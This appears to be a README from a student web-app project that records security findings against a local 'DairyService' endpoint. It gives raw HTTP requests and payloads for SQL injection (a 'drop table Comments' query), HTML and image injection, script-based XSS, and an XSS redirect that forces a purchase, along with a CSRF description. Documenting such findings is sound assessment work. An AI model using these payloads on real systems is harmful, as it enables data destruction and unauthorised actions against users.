# e-Commerce-App
Web app front-end developed  using HTML5 and CSS while back-end data is extracted from  existing APIs with  JavaScript/xml.

N01:	SQL Injection is possible within the search section.
	http://localhost:8188/DairyService.svc/search?term=jbon007%27;%20drop%20table%20Comments;%20--
	

N02:	HTML Injection is possible within the comments section.

	POST http://localhost:8188/DairyService.svc/comment?name=HTML%20Injected
	Content-Type: application/json
	Content-Length: 50
	Host: http://localhost:8188

	<style>*{background-color:pink}</style>


N03: 	HTML image Injection is possible within the comments section.

	POST http://localhost:8188/DairyService.svc/comment?name=Image%20Injected
	Content-Type: application/json
	Content-Length: 100
	Host: http://localhost:8188


	<img src= "https://i1.pickpik.com/photos/388/52/975/cow-funny-ruminant-cute-preview.jpg">


N04: 	XSS (user-supplied script) Injection is possible within the comments section.

	POST http://localhost:8188/DairyService.svc/comment?name=XSS
	Content-Type: application/json
	Content-Length: 50
	Host: http://localhost:8188


	<script>alert("Dont Stay Safe. Do not Wash your hands.")</script>


N05:	CSRF (cross-site request forgery) attacks could be mounted on the service if a user who has already
	logged into his/her account within the website clicks onto a URL which was altered on the website 
	to perform an action which the user did not intend to do such as linking the user to the "buy now" 
	button thus causing the user to purchase an item unintentionally. 

N06:
	POST http://localhost:8188/DairyService.svc/comment?name=XSS
	Content-Type: application/json
	Content-Length: 50
	Host: http://localhost:8188

	<script>window.location = "http://localhost:8189/Service.svc/buy?id=jbon007"</script>
